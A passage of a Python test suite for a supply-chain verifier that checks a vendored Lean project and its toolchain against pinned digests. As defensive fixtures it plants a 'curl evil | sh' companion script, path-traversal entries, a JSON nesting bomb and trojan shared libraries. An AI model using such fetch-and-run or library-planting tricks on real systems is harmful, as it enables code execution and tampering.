            with self.subTest(label):
                pin = json.loads(json.dumps(pristine))
                mutate(pin)
                ws.write_pin(pin)
                self.assertEqual(verdicts(), (False, False))
        ws.write_pin(pristine)
        self.assertEqual(verdicts(), (True, True))

    def test_upstream_pins_marker_cross_check(self) -> None:
        ws = self.workspace()
        with self.subTest("pin metadata disagrees with vendored marker"):
            pin = ws.pin()
            pin["upstream_pins"]["miri_commit"] = "f" * 40
            ws.write_pin(pin)
            self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True, locked_identity=None), "upstream_pins.miri_commit 'ffff")
        with self.subTest("source lock digest disagrees"):
            pin = ws.pin()
            pin["upstream_pins"]["miri_commit"] = V.LOCKED_UPSTREAM_IDENTITY["upstream_pins"]["miri_commit"]
            pin["upstream_pins"]["source_lock_sha256"] = "e" * 64
            ws.write_pin(pin)
            self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), "upstream_pins.source_lock_sha256", "[identity] upstream_pins")

    def test_schema_violations_rejected(self) -> None:
        ws = self.workspace()
        pristine_text = ws.pin_path.read_text()

        def files(pin: Dict[str, Any]) -> List[Dict[str, Any]]:
            return pin["vendor_tree"]["files"]

        cases: List[Tuple[str, Callable[[Dict[str, Any]], None], str]] = [
            ("unknown top-level key", lambda p: p.update(extra=1), "unknown key 'extra'"),
            ("schema_version 3", lambda p: p.update(schema_version=3), "schema_version must be the integer 2"),
            ("schema_version bool", lambda p: p.update(schema_version=True), "schema_version must be the integer 2"),
            ("missing notes", lambda p: p.pop("notes"), "missing key 'notes'"),
            ("uppercase commit", lambda p: p.update(commit=p["commit"].upper()), "commit must be 40 lowercase hex"),
            ("short commit", lambda p: p.update(commit="c92d1d97"), "commit must be 40 lowercase hex"),
            ("bad upstream pin", lambda p: p["upstream_pins"].update(aes_commit="xyz"), "upstream_pins.aes_commit"),
            ("moving toolchain", lambda p: p.update(build_lean_toolchain="leanprover/lean4:stable"), "moving channel"),
            ("file_count drift", lambda p: p["vendor_tree"].update(file_count=607), "file_count 607 != 608"),
            ("path traversal", lambda p: files(p)[5].update(path="../escape.lean"), "path traversal"),
            ("absolute path", lambda p: files(p)[5].update(path="/etc/evil.lean"), "is absolute"),
            ("duplicate path", lambda p: files(p)[6].update(path=files(p)[5]["path"]), "duplicate path"),
            ("case collision", lambda p: files(p)[6].update(path=files(p)[5]["path"].upper().replace(".LEAN", ".lean")), "collides case-insensitively"),
            ("aux .lean", lambda p: p["vendor_aux_files"][0].update(path="Sneaky.lean"), "is a .lean file (belongs in vendor_tree)"),
            ("extra entry key", lambda p: files(p)[0].update(patched_sha256="0" * 64), "unknown key 'patched_sha256'"),
            ("bad git object", lambda p: p["upstream_git_objects"].update(Miri="not-hex"), "upstream_git_objects['Miri'] must be 40"),
            ("non-https repository", lambda p: p.update(repository="git://evil/lean-miri"), "repository must be an https:// URL"),
            ("file shadows directory", lambda p: p["vendor_aux_files"][0].update(path="Miri"), "listed file 'Miri' is also the parent directory"),
            ("patched_files not a list", lambda p: p.update(patched_files={}), "patched_files must be a list"),
        ]
        for label, fn, needle in cases:
            with self.subTest(label):
                pin = json.loads(pristine_text)
                fn(pin)
                ws.write_pin(pin)
                self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), needle)
        for label, text, needle in (
            ("duplicate JSON key", pristine_text.replace('"schema_version": 2,', '"schema_version": 2, "schema_version": 2,', 1), "duplicate JSON object key 'schema_version'"),
            ("NaN", pristine_text.replace('"schema_version": 2,', '"schema_version": NaN,', 1), "non-finite JSON number"),
            ("not an object", "[]", "top level must be a JSON object"),
            ("nesting bomb", "[" * 200000 + "]" * 200000, "JSON nesting too deep"),
        ):
            with self.subTest(label):
                self.assertNotEqual(text, pristine_text)
                ws.pin_path.write_text(text)
                self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), needle)

    def test_unsafe_modes_special_files_and_extraneous_dirs_rejected(self) -> None:
        ws = self.workspace()
        with self.subTest("world-writable vendored file"):
            os.chmod(ws.path("LICENSE-MIT"), 0o666)
            self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), "world-writable file: LICENSE-MIT")
            os.chmod(ws.path("LICENSE-MIT"), 0o644)
        with self.subTest("world-writable directory"):
            os.chmod(ws.path("Miri/ABI"), 0o777)
            self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), "world-writable directory: Miri/ABI/")
            os.chmod(ws.path("Miri/ABI"), 0o755)
        with self.subTest("hard link to a file outside the tree"):
            outside = self.tmp / "outside-LICENSE-MIT"
            os.link(ws.path("LICENSE-MIT"), outside)
            self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), "hard-linked file (st_nlink=2, writable through another path): LICENSE-MIT")
            outside.unlink()
        with self.subTest("FIFO"):
            os.mkfifo(ws.path("Miri/ABI/pipe"))
            self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), "non-regular file (device, FIFO or socket): Miri/ABI/pipe")
            ws.path("Miri/ABI/pipe").unlink()
        with self.subTest("empty extraneous directory"):
            ws.path("Miri/Empty").mkdir()
            self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), "extraneous directory (contains no pinned file): Miri/Empty/")
            ws.path("Miri/Empty").rmdir()
        with self.subTest("UPSTREAM_PIN.json symlink"):
            real = self.tmp / "pin-copy.json"
            shutil.copy2(ws.pin_path, real)
            ws.pin_path.unlink()
            os.symlink(real, ws.pin_path)
            self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), "lean-miri/UPSTREAM_PIN.json is a symlink")

    def test_execution_machine_closure_requires_explicit_olean_dir(self) -> None:
        ws = self.workspace()
        olean = self.tmp / "olean"
        blobs = {"Miri/Interpreter/ExecutionMachine.olean": b"olean-em", "Miri/Interpreter/Place.olean": b"olean-place"}
        for rel, data in blobs.items():
            (olean / rel).parent.mkdir(parents=True, exist_ok=True)
            (olean / rel).write_bytes(data)
        verify = lambda **kw: V.verify_vendor(ws.root, allow_deinit_patch=True, **kw)  # noqa: E731
        with self.subTest("olean dir without closure in the pin"):
            self.assertRejected(lambda: verify(olean_dir=olean), "--olean-dir was supplied but UPSTREAM_PIN.json has no execution_machine_closure")
        pin = ws.pin()
        pin["execution_machine_closure"] = [{"path": rel, "sha256": _sha256(data)} for rel, data in blobs.items()]
        ws.write_pin(pin)
        with self.subTest("no olean dir: skipped"):
            v = verify()
            self.assertEqual((v.closure.status, v.closure.entries), ("skipped", 2))
            self.assertTrue(any("skipped" in w for w in v.warnings))
        with self.subTest("verified"):
            self.assertEqual(verify(olean_dir=olean).closure.status, "verified")
        with self.subTest("tampered olean"):
            (olean / "Miri/Interpreter/Place.olean").write_bytes(b"evil")
            self.assertRejected(lambda: verify(olean_dir=olean), ".olean SHA-256 mismatch for Miri/Interpreter/Place.olean")
            (olean / "Miri/Interpreter/Place.olean").write_bytes(blobs["Miri/Interpreter/Place.olean"])
        with self.subTest("symlinked olean"):
            (olean / "Miri/Interpreter/Place.olean").unlink()
            outside = self.tmp / "Place.olean"
            outside.write_bytes(blobs["Miri/Interpreter/Place.olean"])
            os.symlink(outside, olean / "Miri/Interpreter/Place.olean")
            self.assertRejected(lambda: verify(olean_dir=olean), "invalid file mode for Miri/Interpreter/Place.olean")
            (olean / "Miri/Interpreter/Place.olean").unlink()
            (olean / "Miri/Interpreter/Place.olean").write_bytes(blobs["Miri/Interpreter/Place.olean"])
        with self.subTest("hard-linked olean"):
            hard = self.tmp / "Place-hard.olean"
            os.link(olean / "Miri/Interpreter/Place.olean", hard)
            self.assertRejected(lambda: verify(olean_dir=olean), "invalid file mode for Miri/Interpreter/Place.olean")
            hard.unlink()
        with self.subTest("unlisted olean in olean_dir"):
            rogue = olean / "Miri/Interpreter/Rogue.olean"
            rogue.write_bytes(b"rogue-olean")
            self.assertRejected(lambda: verify(olean_dir=olean), "unlisted .olean file found: Miri/Interpreter/Rogue.olean")
            rogue.unlink()
        with self.subTest("closure without ExecutionMachine / without vendored source"):
            pin["execution_machine_closure"] = [{"path": "Miri/Evil.olean", "sha256": "0" * 64}]
            ws.write_pin(pin)
            self.assertRejected(verify, "must include 'Miri/Interpreter/ExecutionMachine.olean'", "has no vendored source 'Miri/Evil.lean'")


# ---------------------------------------------------------------------------
# Toolchain tests (fake toolchain)
# ---------------------------------------------------------------------------


class ToolchainTests(TempCase):
    def setUp(self) -> None:
        super().setUp()
        self.ws = self.workspace()
        self.tc = make_fake_toolchain(self.tmp)
        self.pin = self.tmp / "toolchain-pin.json"
        V.write_toolchain_pin(V.verify_toolchain(self.ws.root, toolchain_dir=self.tc), self.pin)

    def verify(self, **kwargs: Any) -> Any:
        kwargs.setdefault("toolchain_dir", self.tc)
        kwargs.setdefault("toolchain_pin_json", self.pin)
        return V.verify_toolchain(self.ws.root, **kwargs)

    def lib(self, name: str) -> Path:
        return self.tc / "lib" / "lean" / name

    def canary_lean(self, canary: Path) -> None:
        """bin/lean that records any execution in `canary`; re-pinned."""
        (self.tc / "bin" / "lean").write_text(f"#!/bin/sh\necho pwned > {shlex.quote(str(canary))}\necho 'Lean (version {REPO_LEAN_VERSION}, x86_64-unknown-linux-gnu, commit {FAKE_COMMIT}, Release)'\n")
        os.chmod(self.tc / "bin" / "lean", 0o755)
        V.write_toolchain_pin(V.verify_toolchain(self.ws.root, toolchain_dir=self.tc), self.pin)
        if canary.exists():
            canary.unlink()

    def test_fake_toolchain_pin_roundtrip(self) -> None:
        t = self.verify()
        self.assertEqual(t.pin_status, "verified")
        self.assertEqual(t.resolved_by, "override")
        self.assertTrue(any("test-only override" in w for w in t.warnings))
        self.assertEqual(set(t.files), {"bin/lean", "bin/lake", "lib/lean/libInit_shared.so"} | {f"lib/lean/{n}" for n in LIBLEANSHARED})
        self.assertEqual(t.libleanshared, LIBLEANSHARED)

    def test_libleanshared_tamper_vs_pin_rejected(self) -> None:
        self.lib("libleanshared.so").write_bytes(b"trojan")
        self.assertRejected(self.verify, "SHA-256 mismatch for lib/lean/libleanshared.so")

    def test_companion_libleanshared_1_tamper_rejected_while_main_lib_untouched(self) -> None:
        main_before = self.lib("libleanshared.so").read_bytes()
        self.lib("libleanshared_1.so").write_bytes(self.lib("libleanshared_1.so").read_bytes() + b"\x90")
        self.assertRejected(self.verify, "SHA-256 mismatch for lib/lean/libleanshared_1.so", absent=("lib/lean/libleanshared.so:",))
        self.assertEqual(self.lib("libleanshared.so").read_bytes(), main_before)

    def test_extra_libleanshared_evil_injection_rejected(self) -> None:
        for name in ("libleanshared_evil.so", "libleanshared_3.so", "libleanshared.so.evil"):
            with self.subTest(name):
                self.lib(name).write_bytes(b"evil")
                os.chmod(self.lib(name), 0o644)
                self.assertRejected(self.verify, f"unpinned toolchain file added: lib/lean/{name}")
                self.assertRejected(lambda: self.verify(toolchain_pin_json=None), f"unpinned non-Lean shared library in lib/lean/: lib/lean/{name}")
                self.lib(name).unlink()

    def test_deleted_libleanshared_2_rejected(self) -> None:
        self.lib("libleanshared_2.so").unlink()
        self.assertRejected(self.verify, "pinned toolchain file deleted or unverifiable: lib/lean/libleanshared_2.so")

    def test_libleanshared_so_required_even_without_pin(self) -> None:
        self.lib("libleanshared.so").unlink()
        self.assertRejected(lambda: self.verify(toolchain_pin_json=None), "required toolchain file lib/lean/libleanshared.so is missing")

    def test_world_writable_bin_lean_rejected_and_not_executed(self) -> None:
        os.chmod(self.tc / "bin" / "lean", 0o757)
        self.assertRejected(self.verify, "bin/lean is world-writable", "skipped `bin/lean --version`")

    def test_world_writable_library_rejected(self) -> None:
        os.chmod(self.lib("libleanshared_2.so"), 0o646)
        self.assertRejected(lambda: self.verify(toolchain_pin_json=None), "lib/lean/libleanshared_2.so is world-writable")

    def test_hard_linked_library_rejected(self) -> None:
        os.link(self.lib("libleanshared_1.so"), self.tmp / "alias.so")
        self.assertRejected(self.verify, "lib/lean/libleanshared_1.so is hard-linked (st_nlink=2", "skipped `bin/lean --version`")

    def test_toolchain_symlinks_rejected_escaping_or_not(self) -> None:
        outside = self.tmp / "outside"
        outside.mkdir()
        with self.subTest("bin/lean escapes the toolchain root"):
            shutil.copy2(self.tc / "bin" / "lean", outside / "lean")
            (self.tc / "bin" / "lean").unlink()
            os.symlink(outside / "lean", self.tc / "bin" / "lean")
            self.assertRejected(self.verify, "symlink forbidden: bin/lean ->", "(escapes the toolchain root)")
            (self.tc / "bin" / "lean").unlink()
            shutil.copy2(outside / "lean", self.tc / "bin" / "lean")
        with self.subTest("companion library escapes the toolchain root"):
            shutil.copy2(self.lib("libleanshared_1.so"), outside / "libleanshared_1.so")
            self.lib("libleanshared_1.so").unlink()
            os.symlink(outside / "libleanshared_1.so", self.lib("libleanshared_1.so"))
            self.assertRejected(self.verify, "symlink forbidden: lib/lean/libleanshared_1.so ->", "(escapes the toolchain root)")
            self.lib("libleanshared_1.so").unlink()
            shutil.copy2(outside / "libleanshared_1.so", self.lib("libleanshared_1.so"))
        with self.subTest("internal symlink is still forbidden"):
            self.lib("libleanshared_2.so").unlink()
            os.symlink("libleanshared_1.so", self.lib("libleanshared_2.so"))
            self.assertRejected(self.verify, "symlink forbidden: lib/lean/libleanshared_2.so -> libleanshared_1.so (stays inside")
        with self.subTest("lib/lean directory escapes the toolchain root"):
            shutil.move(str(self.tc / "lib" / "lean"), str(outside / "lean-lib"))
            os.symlink(outside / "lean-lib", self.tc / "lib" / "lean")
            self.assertRejected(self.verify, "symlink forbidden: lib/lean ->")

    def test_lean_toolchain_drift_rejected(self) -> None:
        (self.ws.root / "lean-toolchain").write_text("leanprover/lean4:v4.35.0\n")
        self.assertRejected(
            lambda: V.verify_all(self.ws.root, toolchain_dir=self.tc, allow_deinit_patch=True),
            "toolchain drift: lean-toolchain is 'leanprover/lean4:v4.35.0' but UPSTREAM_PIN.json build_lean_toolchain is",
            "bin/lean reports version",
        )
        (self.ws.root / "lean-toolchain").write_text("leanprover/lean4:stable\n")
        self.assertRejected(lambda: V.verify_all(self.ws.root, toolchain_dir=self.tc, allow_deinit_patch=True), "moving channel")

    def test_version_and_commit_mismatches_rejected(self) -> None:
        cases = [
            ("lean version", dict(lean_body=f"echo 'Lean (version 4.0.0, x86_64-unknown-linux-gnu, commit {FAKE_COMMIT}, Release)'"), "bin/lean reports version 4.0.0"),
            ("lake version", dict(lake_body=f"echo 'Lake version 5.0.0-src+{FAKE_COMMIT[:7]} (Lean version 4.0.0)'"), "bin/lake reports Lean version 4.0.0"),
            ("lake commit", dict(lake_body=f"echo 'Lake version 5.0.0-src+deadbee (Lean version {REPO_LEAN_VERSION})'"), "build commit deadbee does not match"),
            ("garbage", dict(lean_body="echo 'totally not lean'"), "unrecognized `bin/lean --version` output"),
            ("non-zero exit", dict(lean_body="echo boom >&2; exit 3"), "`bin/lean --version` exited 3"),
            ("reads stdin", dict(lean_body="read line || exit 4; echo got"), "`bin/lean --version` exited 4"),
        ]
        for index, (label, kwargs, needle) in enumerate(cases):
            with self.subTest(label):
                tc = make_fake_toolchain(self.tmp, name=f"tc{index}", **kwargs)
                self.assertRejected(lambda: V.verify_toolchain(self.ws.root, toolchain_dir=tc), needle)

    def test_version_probe_timeout_rejected(self) -> None:
        tc = make_fake_toolchain(self.tmp, name="slow", lean_body="exec sleep 30")
        self.assertRejected(lambda: V.verify_toolchain(self.ws.root, toolchain_dir=tc, timeout=0.5), "`bin/lean --version` timed out")

    def test_toolchain_pin_name_and_schema_rejections(self) -> None:
        pin = json.loads(self.pin.read_text())
        cases = [
            ("other toolchain", dict(pin, toolchain="leanprover/lean4:v4.0.0"), "toolchain pin is for 'leanprover/lean4:v4.0.0'"),
            ("unknown key", dict(pin, extra=True), "unknown key 'extra'"),
            ("bad digest", dict(pin, files=dict(pin["files"], **{"bin/lean": "xyz"})), "toolchain pin entry 'bin/lean': invalid path or SHA-256"),
            ("missing required file", dict(pin, files={k: v for k, v in pin["files"].items() if k != "lib/lean/libleanshared.so"}), "missing required entry 'lib/lean/libleanshared.so'"),
            ("version drift", dict(pin, versions=dict(pin["versions"], **{"bin/lake": "Lake version 0"})), "bin/lake --version"),
        ]
        for label, doc, needle in cases:
            with self.subTest(label):
                self.pin.write_text(json.dumps(doc))
                self.assertRejected(self.verify, needle)

    def test_locked_release_pin_rejects_substituted_elan_toolchain(self) -> None:
        if V.host_platform_triple() != LOCKED_PLATFORM:
            self.skipTest("the locked release pin is for x86_64 Linux")
        elan = self.tmp / "elan"
        installed = elan / "toolchains" / V.toolchain_dir_name(REPO_TOOLCHAIN)
        installed.parent.mkdir(parents=True)
        shutil.copytree(self.tc, installed, symlinks=True)
        # Default run (no explicit pin): the compiled-in release pin rejects a
        # substituted toolchain installed under the pinned elan name.
        for needle in (
            "(locked release pin) SHA-256 mismatch for lib/lean/libleanshared_1.so",
            "(locked release pin) SHA-256 mismatch for bin/lean",
            "(locked release pin) pinned toolchain file deleted or unverifiable: lib/lean/libLake_shared.so",
            "(locked release pin) pinned toolchain file deleted or unverifiable: bin/leanc",
            "(locked release pin) pinned toolchain file deleted or unverifiable: bin/leanchecker",
        ):
            with self.subTest(needle):
                self.assertRejected(lambda: V.verify_toolchain(self.ws.root, elan_home=elan, environ={}), needle)
        # An explicit pin takes precedence over the locked release pin.
        t = V.verify_toolchain(self.ws.root, elan_home=elan, environ={}, toolchain_pin_json=self.pin)
        self.assertEqual(t.pin_status, "verified")

    def test_elan_home_resolution_and_override_detection(self) -> None:
        elan = self.tmp / "elan"
        installed = elan / "toolchains" / V.toolchain_dir_name(REPO_TOOLCHAIN)
        installed.parent.mkdir(parents=True)
        shutil.copytree(self.tc, installed, symlinks=True)
        t = V.verify_toolchain(self.ws.root, elan_home=elan, environ={}, toolchain_pin_json=self.pin)
        self.assertEqual(Path(t.toolchain_dir), installed)
        self.assertEqual((t.resolved_by, t.warnings), ("elan", ()))
        shadow = self.tmp / "shadow-bin"
        shadow.mkdir()
        shutil.copy2(self.tc / "bin" / "lean", shadow / "lean")
        shadowed = V.verify_toolchain(self.ws.root, elan_home=elan, environ={"PATH": str(shadow)}, toolchain_pin_json=self.pin)
        self.assertTrue(any("`lean` on PATH resolves to" in w for w in shadowed.warnings), shadowed.warnings)
        self.assertEqual(
            V.verify_toolchain(self.ws.root, environ={"ELAN_HOME": str(elan)}, toolchain_pin_json=self.pin).toolchain_dir,
            str(installed),
        )
        self.assertRejected(
            lambda: V.verify_toolchain(self.ws.root, elan_home=elan, environ={"ELAN_TOOLCHAIN": "leanprover/lean4:v4.0.0"}),
            "ELAN_TOOLCHAIN='leanprover/lean4:v4.0.0' overrides",
        )
        (elan / "settings.toml").write_text(f'default_toolchain = "{REPO_TOOLCHAIN}"\n\n[overrides]\n"{self.ws.root.resolve()}" = "leanprover/lean4:v4.0.0"\n')
        self.assertRejected(lambda: V.verify_toolchain(self.ws.root, elan_home=elan, environ={}), "elan override")
        (elan / "settings.toml").write_text(f'default_toolchain = "{REPO_TOOLCHAIN}"\n\n[overrides]\n"{self.ws.root.resolve().parent}" = "leanprover/lean4:v4.0.0"\n')
        self.assertRejected(lambda: V.verify_toolchain(self.ws.root, elan_home=elan, environ={}), "elan override")
        (elan / "settings.toml").unlink()
        shutil.rmtree(installed)
        self.assertRejected(lambda: V.verify_toolchain(self.ws.root, elan_home=elan, environ={}), "is not installed as a real directory")

    def test_tampered_binary_or_libleanshared_not_executed_when_pin_mismatches(self) -> None:
        canary = self.tmp / "trojan-executed"
        (self.tc / "bin" / "lean").write_text(f"#!/bin/sh\necho pwned > {shlex.quote(str(canary))}\necho 'Lean (version {REPO_LEAN_VERSION}, x86_64-unknown-linux-gnu, commit {FAKE_COMMIT}, Release)'\n")
        os.chmod(self.tc / "bin" / "lean", 0o755)
        self.assertRejected(self.verify, "SHA-256 mismatch for bin/lean", "skipped `bin/lean --version`")
        self.assertFalse(canary.exists(), "tampered bin/lean was executed before pin digest verification!")

    def test_companion_executable_tamper_or_addition_rejected_and_not_executed(self) -> None:
        canary = self.tmp / "companion-executed"
        self.canary_lean(canary)
        leanc = self.tc / "bin" / "leanc"
        leanc.write_text("#!/bin/sh\nexec clang \"$@\"\n")
        os.chmod(leanc, 0o755)
        V.write_toolchain_pin(V.verify_toolchain(self.ws.root, toolchain_dir=self.tc), self.pin)
        self.assertIn("bin/leanc", json.loads(self.pin.read_text())["files"])
        self.assertEqual(self.verify().pin_status, "verified")
        if canary.exists():
            canary.unlink()
        with self.subTest("tampered companion"):
            leanc.write_text("#!/bin/sh\ncurl evil | sh\n")
            self.assertRejected(self.verify, "SHA-256 mismatch for bin/leanc", "skipped `bin/lean --version`")
            self.assertFalse(canary.exists())
            leanc.write_text("#!/bin/sh\nexec clang \"$@\"\n")
        with self.subTest("planted extra executable"):
            (self.tc / "bin" / "ld").write_text("#!/bin/sh\nexit 0\n")
            os.chmod(self.tc / "bin" / "ld", 0o755)
            self.assertRejected(self.verify, "unpinned toolchain file added: bin/ld", "skipped `bin/lean --version`")
            self.assertFalse(canary.exists())
            (self.tc / "bin" / "ld").unlink()
        with self.subTest("companion replaced by a symlink"):
            leanc.unlink()
            os.symlink("lean", leanc)
            self.assertRejected(self.verify, "symlink forbidden: bin/leanc -> lean (stays inside", "skipped `bin/lean --version`")
            self.assertFalse(canary.exists())

    def test_runpath_shadowing_in_parent_lib_dir_rejected_and_not_executed(self) -> None:
        canary = self.tmp / "runpath-shadow-executed"
        self.canary_lean(canary)
        shadow = self.tc / "lib" / "libleanshared_1.so"
        shadow.write_bytes(b"shadow-trojan")
        os.chmod(shadow, 0o644)
        self.assertRejected(
            self.verify,
            "RUNPATH shadowing library in lib/ (shadows lib/lean/): lib/libleanshared_1.so",
            "skipped `bin/lean --version`",
        )
        self.assertFalse(canary.exists(), "bin/lean was executed despite RUNPATH shadowing in lib/!")

    def test_system_soname_planted_in_runpath_dir_rejected_and_not_executed(self) -> None:
        canary = self.tmp / "system-soname-executed"
        self.canary_lean(canary)
        for rel in ("lib/libc.so.6", "lib/libm.so.6", "lib/lean/libpthread.so.0", "lib/ld-linux-x86-64.so.2"):
            with self.subTest(rel):
                planted = self.tc / rel
                planted.write_bytes(b"\x7fELF-trojan")
                os.chmod(planted, 0o644)
                self.assertRejected(self.verify, f"system soname planted in a toolchain RUNPATH directory: {rel}", "skipped `bin/lean --version`")
                self.assertFalse(canary.exists(), f"bin/lean was executed despite a planted {rel}")
                planted.unlink()

    def repin_bin(self, rel: str, data: bytes, extra_libs: Optional[Dict[str, bytes]] = None) -> None:
        """Install `data` as `rel` (plus optional extra `lib/lean/` files) and
        re-pin only those digests, so the pin compare passes and the defect under
        test is the only one left."""
        (self.tc / rel).write_bytes(data)
        os.chmod(self.tc / rel, 0o755)
        doc = json.loads(self.pin.read_text(encoding="utf-8"))
        doc["files"][rel] = hashlib.sha256(data).hexdigest()
        for name, body in (extra_libs or {}).items():
            self.lib(name).write_bytes(body)
            os.chmod(self.lib(name), 0o644)
            doc["files"][f"lib/lean/{name}"] = hashlib.sha256(body).hexdigest()
        self.pin.write_text(json.dumps(doc, indent=2, sort_keys=True) + "\n", encoding="utf-8")

    def repin_bin_lean(self, data: bytes, extra_libs: Optional[Dict[str, bytes]] = None) -> None:
        self.repin_bin("bin/lean", data, extra_libs)

    def test_elf_runpath_resolution_clean_synthetic_binary_reaches_exec_gate(self) -> None:
        # Positive control: a pinned ELF bin/lean whose DT_NEEDED sonames resolve
        # (via its DT_RUNPATH) only to pinned files -- or fall through to the
        # system because they are absent -- passes the RUNPATH check and reaches
        # the `--version` gate. e_machine = EM_BPF, so no host can execute it.
        self.repin_bin_lean(make_elf64(["libleanshared.so", "libc.so.6"], ["$ORIGIN/../lib", "${ORIGIN}/../lib/lean"], machine=247))
        self.assertRejected(
            self.verify,
            "cannot execute `bin/lean --version`",
            absent=("RUNPATH", "DT_", "cannot parse", "SHA-256 mismatch", "skipped `bin/lean --version`"),
        )

    def test_elf_runpath_escape_unsupported_token_path_needed_and_generic_shadow_rejected(self) -> None:
        outside = self.tmp / "evil-lib"
        outside.mkdir()
        # A non-Lean, non-glibc soname: only the generic DT_NEEDED x DT_RUNPATH
        # resolution can catch it (neither static name list mentions libz).
        planted = self.tc / "lib" / "libz.so.1"
        planted.write_bytes(b"\x7fELF-trojan-zlib")
        os.chmod(planted, 0o644)
        cases = (
            (["libleanshared.so"], [str(outside)], f"bin/lean: DT_RUNPATH entry {str(outside)!r} resolves outside the toolchain root"),
            (["libleanshared.so"], ["$ORIGIN/../.."], "bin/lean: DT_RUNPATH entry '$ORIGIN/../..' resolves outside the toolchain root"),
            (["libleanshared.so"], ["$ORIGIN/.."], "bin/lean: DT_RUNPATH entry '$ORIGIN/..' resolves outside the toolchain root"),
            (["libleanshared.so"], ["$ORIGIN/../lib/.."], "bin/lean: DT_RUNPATH entry '$ORIGIN/../lib/..' resolves outside the toolchain root"),
            (["libleanshared.so"], [f"$ORIGIN/../../{self.tc.name}/lib"], f"bin/lean: DT_RUNPATH entry '$ORIGIN/../../{self.tc.name}/lib' resolves outside the toolchain root"),
            (["libleanshared.so"], ["${ORIGIN}/../lib:"], "bin/lean: empty DT_RUNPATH/DT_RPATH component"),
            (["libleanshared.so"], ["$LIB/x"], "bin/lean: unsupported DT_RUNPATH entry '$LIB/x'"),
            (["libleanshared.so"], ["lib/lean"], "bin/lean: unsupported DT_RUNPATH entry 'lib/lean'"),
            (["/tmp/evil.so"], ["$ORIGIN/../lib/lean"], "bin/lean: DT_NEEDED entry '/tmp/evil.so' is a path"),
            (["sub/evil.so"], ["$ORIGIN/../lib/lean"], "bin/lean: DT_NEEDED entry 'sub/evil.so' is a path"),
            ([""], ["$ORIGIN/../lib/lean"], "bin/lean: DT_NEEDED entry '' is a path"),
            (["."], ["$ORIGIN/../lib/lean"], "bin/lean: DT_NEEDED entry '.' is a path"),
            ([".."], ["$ORIGIN/../lib/lean"], "bin/lean: DT_NEEDED entry '..' is a path"),
            (["$ORIGIN/evil.so"], ["$ORIGIN/../lib/lean"], "bin/lean: DT_NEEDED entry '$ORIGIN/evil.so' is a path"),
            (["$ORIGIN"], ["$ORIGIN/../lib/lean"], "bin/lean: DT_NEEDED entry '$ORIGIN' is a path"),
            (["libz.so.1"], ["$ORIGIN/../lib"], "RUNPATH shadowing: bin/lean needs 'libz.so.1', which ld.so can resolve to the unpinned toolchain file lib/libz.so.1"),
        )
        for needed, runpath, needle in cases:
            with self.subTest(needed=needed, runpath=runpath):
                self.repin_bin_lean(make_elf64(needed, runpath))
                self.assertRejected(self.verify, needle, "skipped `bin/lean --version`", absent=("SHA-256 mismatch",))
        # DT_RPATH (15) is resolved exactly like DT_RUNPATH here.
        self.repin_bin_lean(make_elf64(["libz.so.1"], ["$ORIGIN/../lib"], rpath_tag=15))
        self.assertRejected(self.verify, "which ld.so can resolve to the unpinned toolchain file lib/libz.so.1", absent=("SHA-256 mismatch",))

    def test_runpath_checked_companions_vs_digest_only_companions(self) -> None:
        # `bin/leanc` (run by check_trusted.py --fast) is RUNPATH-checked like
        # bin/lean; `bin/clang` is digest-pinned only (its closure is the
        # release's own top-level lib/, see "Known limits").
        planted = self.tc / "lib" / "libz.so.1"
        planted.write_bytes(b"\x7fELF-trojan-zlib")
        os.chmod(planted, 0o644)
        self.repin_bin("bin/leanc", make_elf64(["libz.so.1"], ["$ORIGIN/../lib"]))
        self.assertRejected(self.verify, "RUNPATH shadowing: bin/leanc needs 'libz.so.1', which ld.so can resolve to the unpinned toolchain file lib/libz.so.1")
        (self.tc / "bin" / "leanc").unlink()
        doc = json.loads(self.pin.read_text(encoding="utf-8"))
        del doc["files"]["bin/leanc"]
        self.pin.write_text(json.dumps(doc), encoding="utf-8")
        self.repin_bin("bin/clang", make_elf64(["libz.so.1"], ["$ORIGIN/../lib"]))
        t = self.verify()  # fake bin/lean: --version succeeds
        self.assertIn("bin/clang", t.files)

    def test_unparseable_elf_in_pinned_set_fails_closed(self) -> None:
        self.repin_bin_lean(make_elf64(["libleanshared.so"], ["$ORIGIN/../lib/lean"], unterminated=True))
        self.assertRejected(self.verify, "cannot parse the ELF dynamic section of bin/lean: unterminated", "skipped `bin/lean --version`", absent=("SHA-256 mismatch",))

    def test_runpath_shadow_hidden_behind_ignored_dt_rpath_rejected(self) -> None:
        # ld.so ignores DT_RPATH when DT_RUNPATH is present. A first-hit scan in
        # dynamic-section order would see DT_RPATH's lib/lean/libz.so.1 (pinned)
        # first and stop, while ld.so actually loads the planted lib/libz.so.1.
        planted = self.tc / "lib" / "libz.so.1"
        planted.write_bytes(b"\x7fELF-trojan-zlib")
        os.chmod(planted, 0o644)
        self.repin_bin_lean(
            make_elf64(["libz.so.1"], ["$ORIGIN/../lib"], rpath=["$ORIGIN/../lib/lean"]),
            extra_libs={"libz.so.1": b"pinned-zlib"},
        )
        self.assertEqual(V.elf_dynamic_info(self.tc / "bin" / "lean"), (("libz.so.1",), ("$ORIGIN/../lib/lean", "$ORIGIN/../lib")))
        self.assertRejected(
            self.verify,
            "RUNPATH shadowing: bin/lean needs 'libz.so.1', which ld.so can resolve to the unpinned toolchain file lib/libz.so.1",
            "skipped `bin/lean --version`",
            absent=("SHA-256 mismatch", "unpinned toolchain file added", "lib/lean/libz.so.1,"),
        )
        planted.unlink()
        # Control: the same pinned set without the planted file passes the RUNPATH
        # check and reaches the exec gate (EM_BPF, so it cannot actually run).
        self.assertRejected(self.verify, "cannot execute `bin/lean --version`", absent=("RUNPATH", "SHA-256 mismatch", "skipped `bin/lean --version`"))

    def test_glibc_runpath_semantics_empty_component_and_non_dst_origin_rejected(self) -> None:
        # glibc `fillin_rpath`: an empty RUNPATH element is the current working
        # directory (and `_run_version` runs with cwd = bin/); glibc `is_dst`:
